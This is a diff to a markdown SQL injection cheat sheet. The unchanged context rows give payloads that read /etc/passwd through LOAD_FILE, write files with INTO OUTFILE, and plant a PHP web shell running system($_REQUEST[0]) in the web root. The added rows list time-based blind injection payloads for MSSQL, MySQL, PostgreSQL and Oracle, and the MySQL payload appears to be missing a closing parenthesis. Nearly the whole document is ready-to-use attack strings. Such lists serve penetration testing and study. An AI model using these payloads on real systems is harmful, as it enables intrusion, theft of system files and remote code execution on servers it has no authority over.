@@ -69,3 +69,11 @@
 | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                   | Read local file                                      |
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                                                               | Write a string to a local file                       |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                  | Write a web shell into the base web directory        |
+SLEEP TEST
+
+| Database      | Payload                                                   |
+| ------------- | --------------------------------------------------------- |
+| MSSQL         | WAITFOR DELAY '0:0:10'                                    |
+| MySQL/MariaDB | AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%' |
+| PostgreSQL    | \| (SELECT 1 FROM PG_SLEEP(10))                           |
+| Oracle        | AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)          |
